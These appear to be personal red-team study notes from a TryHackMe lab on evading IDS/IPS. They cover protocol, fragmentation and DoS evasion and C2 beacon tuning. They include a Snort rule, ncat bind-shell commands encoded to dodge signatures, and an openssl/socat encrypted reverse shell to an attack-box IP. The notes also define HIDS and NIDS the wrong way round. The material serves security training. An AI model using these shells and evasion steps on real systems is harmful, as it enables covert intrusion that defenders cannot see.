# Evading-IPS-And-IDS
Visit the [[Intrusion-Detection-Systems]] and [[Intrusion-Prevention-Systems]] articles for more

## Definitions

Acronym | Full Name
--- | --- 
IPS | Intrusion Prevention System
IDS  |Intrusion Detection System
HIDS |  Network-based-IDS
NIDS |  Host-based-IDS

Network Traffic and Host activities is either Benign or Malicious traffic.

Method of Detection | Description
--- | ---
Signature-based | Signatures of known malicious traffic fed into IDS.
Anomaly/Behaviour-based |  Regular traffic model, for IDS to detect anomalies.
Policy-based |  Detect based on policy violations

## IDS/IPS each have rule syntax:
For example [[Snort]] uses:

Rule Header | Rule options 
--- | ---
Action		|	alert, log, pass, drop and reject
Protocol	| 	TCP, UDP, ICMP or IP
Source IP/Port  | IP/mask any # = anything but from IP/mask range
Direction of Flow |	sourceTOdestination = '->'; '<>' birectional 
Destination IP/Port |Similar to Source IP/Port
Some more specifics | `flow:established` (full three handsake stream), `content:"<TYPE>"` 

Snort rule that detects the term `ncat` in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability would end up like:
``alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)


## Evasion via protocol manipulation includes:

- Use different protocol
- Source Port
- Session Splicing
- Invalid Packets

#### Relying on a different protocol

IF TCP|UDP THEN use UDP|TCP
	ncat -ulvnp PORT_NUM # u for udp listener

IF web-browsing-allowed THEN:
	(protected-host can connect via port 80 and 443, unless local proxy is used)

	Use a Google web hosting to concelal malicious site
IF IPS blocks DNS-queries && HTTP requests THEN:
	(local machines (cannot query external DNS servers)(can query local DNS server)&& enforces HTTP communications)	
	HTTPS can tunnel traffic to evade IPS 

#### Manipulating (Source) TCP/UDP port

If you all your traffic coming from an established [[Network-Services]] port then the recieving end will interpret just by port number, allowing for evasion. Without deep packet inspection, the port numbers are the primary indicator of the service used, unless the security solution can analyze the data carried by the TCP segments.


#### Session Splicing

IPv4, IP packet fragmentation or session splicing - simiply breaking and or reordering packets of data up. The assumption regarding this strategies potental evasiveneess is that if traffic is in smaller packets, you will avoid matching to any of the IDS signatures. Dividing your payload among multiple packets and potential reordering them and the reordering it back to its orginal linear order will evade IDS parsing for particular stream of bytes. Unless the IDS reassembles the packets, the rule won’t be triggered.

#### Sending Invalid Packets

Sending invalid packets the response of systems is unclear, therefore experimenting to with invalid pakects an IDS/IPS might process it, while the target system might ignore it.

Refer to [[Nmap-Cheatsheet]] for experimenting with invalid packets to prove the existence of IDS/IPS.

Suppose you want to force all your packets to be fragmented into specific sizes: see [monkey](https://www.monkey.org/~dugsong/fragroute/)

#### Custom packets with Custom fields:
`hping3 --help`

## Evasion via Payload Manipulation

####  Obfuscating and encoding the payload
```bash
ncat -lvnp 1234 -e /bin/bash 	=	bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== 	#base64
ncat -lvnp 1234 -e /bin/bash	=	ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbas		#urlencode
ncat -lvnp 1234 -e /bin/bash 	=       # escape unicode, with cyberchef

`\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`
```

#### Encrypting the communication channel
Create Privacy Enhanced Mail(PEM), see [[Socat-Cheatsheet]]
```bash
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

#   req indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
#   -x509 specifies that we want an X.509 certificate
#   -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048.)
#   -days 365 shows that the validity of our certificate will be one year
#   -subj sets data, such as organization and country, via the command-line.
#   -nodes simplifies our command and does not encrypt the private key
#   -keyout PRIVATE_KEY specifies the filename where we want to save our private key
#   -out CERTIFICATE specifies the filename to which we want to write the certificate request


cat reverse.key reverse.crt > reverse.pem

# listener that return execution output
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

#    -d -d provides some debugging data (fatal, error, warning, and notice messages)
#    OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL
#    cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection
#    verify=0 disables checking peer’s certificate
#    fork creates a sub-process to handle each new connection.

# socat:	
# On Attack box:
socat -d -d TCP-LISTEN:4443,fork STDOUT
# On target machine:
socat OPENSSL:10.10.10.10:4443,verify=0 EXEC:/bin/bash
```

#### Modifying the shellcode

## Route Manipulation

For route manipulation see [[Proxies]] and [[Port-Redirection-And-Tunneling]]

With examples from the THM Room use: [[Nmap-Cheatsheet]]

Relying on source routing with `--ip-options "L $IP $IP $IP"` would specify loose routing - scan through any in the array, whereas strict routing with `"S"` as the 0th index of the string would strict hop from first `$IP` to the last. Using proxy servers with `--proxies proto://host:port, proto://host:port`, valid protocols are HTTP and SOCKS4 - authenication is not supported.


## Evasion via Tactical DoS

IDS/IPS requires a high processing power to managing and regulate rules grows and tthe network traffic volume increase, and with spefically IDS logging of said traffic and matching of rule signatures.
1. Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
1. Create a massive amount of not-malicious traffic that would still make it to the logs, congesting the communication channel with the logging server or exceed its disk writing capacity.

## C2 Evasive Tactices
See [[Introduction-To-Comand-And-Control-Frameworks]] for more information:

1. User Agent - Innocuous configuration rather than default
2. Sleep time - control callback interval between beacon checkins
3. Jitter - Pseudo-Randomness of sleep time THM:*"A jitter of 30% results in a sleep time of ±30% to further evade detection."*
4. SSL Certificate - Authenicity equals success
5. DNS Beacon - If exfiltrating data via DNS - configure DNS server and the hostname in the DNS query

[Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)


## Next-Gen Security

Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):

1.  Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
2.  Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
3.  Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.
4.  Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
5.  Agile engine: Support upgrade paths to benefit from new information feeds.


## References
[THM Network Evasion Room](https://tryhackme.com/room/redteamnetsec)
[Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
[monkey](https://www.monkey.org/~dugsong/fragroute/)
[Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):